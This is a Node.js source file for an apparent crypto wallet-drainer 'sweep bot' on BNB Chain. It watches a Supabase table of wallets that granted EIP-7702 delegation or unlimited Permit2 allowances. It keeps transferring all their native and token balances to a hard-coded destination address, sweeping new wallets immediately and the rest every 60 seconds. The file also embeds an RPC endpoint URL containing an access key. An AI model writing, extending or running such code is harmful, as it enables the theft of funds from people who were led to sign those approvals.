// bot.js — Sweep bot with EIP-7702 delegation + Permit2 AllowanceTransfer support
// Watches delegated_wallets via Supabase Realtime.
//
// Architecture:
//   wsProvider  — WebSocketProvider for instant block events (WS_URL)
//   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
//
// Sweep strategy:
//   Block events         → sweep wallets whose 60s cooldown has expired
//   delegated_wallets RT → instant sweep on new/updated wallet
//
// Permit2 AllowanceTransfer flow:
//   User calls permit2.approve(token, relayer, MaxUint160, MaxUint48) once.
//   Bot calls permit2.transferFrom(user, dest, balance, token) — no signature,
//   no nonce, no expiry concern. Allowance is stored in the Permit2 contract.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");
const ws = require("ws");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY               = process.env.PRIVATE_KEY;
const WS_URL = process.env.WS_URL
  || "wss://falling-quiet-spring.bsc.quiknode.pro/d979711c9eb1807216904f0e8bb5e5173f4f6cca";
const RPC_URL = process.env.RPC_URL
  || "https://falling-quiet-spring.bsc.quiknode.pro/d979711c9eb1807216904f0e8bb5e5173f4f6cca";
const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL              = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN                     = process.env.CHAIN || "bnb";

const PERMIT2_ADDRESS   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const MIN_ETH_WEI       = ethers.parseEther("0.001");
const MIN_TOKEN_UNITS   = "0.5";
const SWEEP_COOLDOWN_MS = 60_000; // 60s per-wallet cooldown — BNB QuickNode 50/s limit
const TOKEN_CALL_DELAY  = 150;    // ms after each token call

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE env missing — Realtime disabled");
}

// ── Providers ─────────────────────────────────────────────────────────────────
//
// rpcProvider — HTTP JsonRpc for ALL contract/balance/fee/tx calls
// wsProvider  — WebSocket for block events ONLY; recreated on disconnect
//               NEVER passed to a Contract or Wallet

const rpcProvider = new ethers.JsonRpcProvider(RPC_URL);

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
      auth: { persistSession: false },
      realtime: { transport: ws },
    })
  : null;

// ── ABIs ──────────────────────────────────────────────────────────────────────

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

// Permit2 AllowanceTransfer — bot calls transferFrom after user set allowance.
// No signature needed. amount is uint160 (cast balance to uint160 before call).
const PERMIT2_ABI = [
  "function transferFrom(address from, address to, uint160 amount, address token) external",
];

// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
// RULE: wsProvider is NEVER passed to a Contract or Wallet.

const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
const contract      = CONTRACT_ADDRESS
  ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
  : null;

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH        = false;
const sweepingToken    = {};
const delegatedWallets = new Map(); // address → type ("eip7702" | "permit2")
const lastSwept        = new Map(); // address → timestamp of last sweep
let realtimeChannel    = null;
const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
let reconnectAttempt   = 0;
let isProcessing       = false; // block-overlap guard — skip block if previous still running

// ── Logging ───────────────────────────────────────────────────────────────────

const TAG  = `[${CHAIN.toUpperCase()}]`;
const log  = (msg) => console.log(`[${new Date().toISOString()}] ${TAG} ${msg}`);
const warn = (msg) => console.warn(`[${new Date().toISOString()}] ${TAG} ⚠  ${msg}`);
const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  ${msg}`);

// ── Helpers ───────────────────────────────────────────────────────────────────

function normalizeAddress(addr) {
  try { return ethers.getAddress(addr); } catch { return null; }
}

async function getFeeData() {
  const f = await rpcProvider.getFeeData();
  return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
}

// 60s cooldown — Realtime events bypass this entirely
function shouldSweep(address) {
  const last = lastSwept.get(address.toLowerCase());
  if (!last) return true;
  return Date.now() - last > SWEEP_COOLDOWN_MS;
}

function markSwept(address) {
  lastSwept.set(address.toLowerCase(), Date.now());
}

// ── Main-contract sweep ───────────────────────────────────────────────────────

async function sweepETH() {
  if (sweepingETH || !contract) return;
  sweepingETH = true;
  try {
    const bal = await rpcProvider.getBalance(contract.target);
    if (bal < MIN_ETH_WEI) return;
    log(`Contract ETH ${ethers.formatEther(bal)} — sweeping`);
    const gas = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepETH tx: ${tx.hash}`);
    await tx.wait();
    log("sweepETH confirmed");
  } catch (e) { err(`sweepETH: ${e.message}`); }
  finally    { sweepingETH = false; }
}

async function sweepToken(tokenAddress) {
  const key = tokenAddress.toLowerCase();
  if (sweepingToken[key] || !contract) return;
  sweepingToken[key] = true;
  try {
    const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
    const balance = await token.balanceOf(contract.target);
    let decimals  = 18;
    try { decimals = await token.decimals(); } catch {}
    if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) return;
    let symbol = tokenAddress.slice(0, 8);
    try { symbol = await token.symbol(); } catch {}
    log(`Contract ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
    const gas = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
    const fee = await getFeeData();
    const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
    log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
    await tx.wait();
  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
  finally     { sweepingToken[key] = false; }
}

// ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────

async function sweepDelegatedWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  try {
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, relayerWallet);

    // ETH first
    try {
      const bal = await rpcProvider.getBalance(checksum);
      if (bal > MIN_ETH_WEI) {
        log(`[eip7702] ${checksum} ETH ${ethers.formatEther(bal)} — sweeping`);
        const gas = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
        const fee = await getFeeData();
        const tx  = await userContract.sweepETH(DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
        log(`[eip7702] sweepETH(${checksum}) tx: ${tx.hash}`);
        await tx.wait();
        log(`[eip7702] sweepETH confirmed for ${checksum}`);
      }
    } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }

    // ERC-20 tokens — sequential with delay after each call
    for (const tokenAddress of TOKENS_TO_WATCH) {
      try {
        const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
        const balance = await token.balanceOf(checksum);
        let decimals  = 18;
        try { decimals = await token.decimals(); } catch {}
        if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
          let symbol = tokenAddress.slice(0, 8);
          try { symbol = await token.symbol(); } catch {}
          log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
          const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
          const fee = await getFeeData();
          const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
            gasLimit: gas * 120n / 100n, ...fee,
          });
          log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
          await tx.wait();
        }
      } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
    }
  } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
}

// ── Permit2 AllowanceTransfer sweep ──────────────────────────────────────────
//
// User previously called:
//   1. erc20.approve(PERMIT2_ADDRESS, MaxUint256)
//   2. permit2.approve(token, relayerWallet, MaxUint160, MaxUint48)
//
// Bot calls permit2.transferFrom(user, destination, balance, token) per token.
// No signature, no nonce, no deadline — allowance lives in Permit2 forever.
//
// Tokens to sweep: read from delegated_wallets.permit_metadata.tokens,
// fallback to TOKENS_TO_WATCH env var.

async function sweepPermit2Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;

  // Resolve token list for this wallet
  let tokenList = TOKENS_TO_WATCH;
  if (supabase) {
    try {
      const { data } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", checksum.toLowerCase())
        .eq("chain", CHAIN)
        .single();
      const stored = data?.permit_metadata?.tokens;
      if (Array.isArray(stored) && stored.length > 0) {
        tokenList = stored;
      }
    } catch {
      // Non-fatal — fall back to env var token list
    }
  }

  if (!tokenList.length) {
    warn(`[permit2] no tokens configured for ${checksum}`);
    return;
  }

  log(`[permit2] checking ${tokenList.length} token(s) for ${checksum}`);

  // Check balances sequentially, call transferFrom for each token with balance
  for (const rawAddress of tokenList) {
    const tokenAddress = normalizeAddress(
      typeof rawAddress === "string" ? rawAddress : rawAddress.address || rawAddress.token
    );
    if (!tokenAddress) continue;

    try {
      const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
      const balance = await token.balanceOf(checksum);

      if (balance === 0n) {
        await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
        continue;
      }

      let symbol = tokenAddress.slice(0, 10);
      try { symbol = await token.symbol(); } catch {}

      log(`[permit2] ${checksum} ${symbol} balance=${ethers.formatUnits(balance, 18)} — transferFrom`);

      const fee = await getFeeData();
      // amount is uint160 — balance fits (uint256 token balances never exceed uint160 in practice)
      const tx = await permit2.transferFrom(
        checksum,
        DESTINATION_ADDRESS,
        balance,
        tokenAddress,
        { gasLimit: 150_000n, ...fee }
      );
      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
      await tx.wait();
      log(`[permit2] confirmed — ${symbol} swept for ${checksum}`);
    } catch (e) {
      const msg = e.message ?? "";
      if (msg.includes("InsufficientAllowance") || msg.includes("allowance")) {
        warn(`[permit2] ${tokenAddress}: no Permit2 allowance for ${checksum} — user must reconnect`);
      } else if (msg.includes("InsufficientBalance") || msg.includes("balance")) {
        // Balance changed between check and tx — harmless
      } else {
        err(`[permit2] transferFrom ${tokenAddress} for ${checksum}: ${msg}`);
      }
    }
    await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
  }
}

// ── Supabase: load existing wallets on startup ────────────────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address, type")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
    delegatedWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
    }
    const p2Count = [...delegatedWallets.values()].filter(t => t === "permit2").length;
    log(`Loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${delegatedWallets.size - p2Count} eip7702)`);
  } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
}

// ── Supabase Realtime ─────────────────────────────────────────────────────────

function subscribeRealtime() {
  if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }

  if (realtimeChannel) {
    supabase.removeChannel(realtimeChannel).catch(() => {});
    realtimeChannel = null;
  }

  realtimeChannel = supabase
    .channel(`bot_realtime_${CHAIN}`)

    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        const isNew = !delegatedWallets.has(address);
        delegatedWallets.set(address, type);
        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (${type}) — sweeping immediately`);
        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
        }
        markSwept(address);
      }
    )

    .on(
      "postgres_changes",
      { event: "UPDATE", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const row     = payload.new || {};
        const address = normalizeAddress(row.address);
        const type    = row.type || "eip7702";
        if (!address) return;
        delegatedWallets.set(address, type);
        log(`🔄 Realtime wallet update ${address} (${type}) — sweeping immediately`);
        if (type === "permit2") {
          await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
        } else {
          await sweepDelegatedWallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
        }
        markSwept(address);
      }
    )

    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`✅ Supabase Realtime subscribed (delegated_wallets, chain=${CHAIN})`);
      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
        warn(`Realtime ${status} — resubscribing in 10s`);
        setTimeout(subscribeRealtime, 10_000);
      }
    });
}

// ── WSS block listener + exponential backoff reconnect ───────────────────────

async function startBot() {
  try {
    const wsProvider = new ethers.WebSocketProvider(WS_URL);

    wsProvider.websocket.on("error", (wsErr) => {
      warn(`WS error: ${wsErr?.message ?? wsErr}`);
    });

    wsProvider.websocket.on("close", () => {
      warn("WS closed — scheduling reconnect…");
      wsProvider.removeAllListeners();
      const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
      reconnectAttempt++;
      log(`Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
      setTimeout(startBot, delay);
    });

    wsProvider.on("block", async (blockNumber) => {
      reconnectAttempt = 0;

      if (isProcessing) {
        log(`Block ${blockNumber} — previous sweep still running, skipping`);
        return;
      }
      isProcessing = true;

      try {
        if (contract) {
          await sweepETH();
          for (const tokenAddress of TOKENS_TO_WATCH) {
            await sweepToken(tokenAddress.trim());
          }
        }

        const due = [...delegatedWallets.keys()].filter(shouldSweep);
        if (!due.length) return;
        log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);

        for (const walletAddress of due) {
          const walletType = delegatedWallets.get(walletAddress);
          try {
            if (walletType === "permit2") {
              await sweepPermit2Wallet(walletAddress);
            } else {
              await sweepDelegatedWallet(walletAddress);
            }
            markSwept(walletAddress);
          } catch (e) {
            err(`sweep failed for ${walletAddress}: ${e.message}`);
          }
          await new Promise((r) => setTimeout(r, 1000));
        }
      } finally {
        isProcessing = false;
      }
    });

    log(`WS connected — listening for blocks`);
  } catch (e) {
    err(`startBot failed: ${e.message}`);
    const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
    reconnectAttempt++;
    log(`Retrying in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
    setTimeout(startBot, delay);
  }
}

// ── Init ──────────────────────────────────────────────────────────────────────

async function init() {
  log("Sweep bot starting…");
  log(`Chain:       ${CHAIN}`);
  log(`Relayer:     ${relayerWallet.address}  ← must match permit2.approve(spender)`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`Permit2:     ${PERMIT2_ADDRESS}`);
  if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);

  try {
    const balance = await rpcProvider.getBalance(relayerWallet.address);
    log(`Relayer bal: ${ethers.formatEther(balance)} native`);
    if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
  } catch (e) {
    warn(`Relayer balance check failed: ${e.message}`);
  }

  await loadDelegatedWallets();
  subscribeRealtime();
  startBot();

  log("Listening for blocks (WSS) and Realtime events…");
}

init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down…"); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down…"); process.exit(0); });
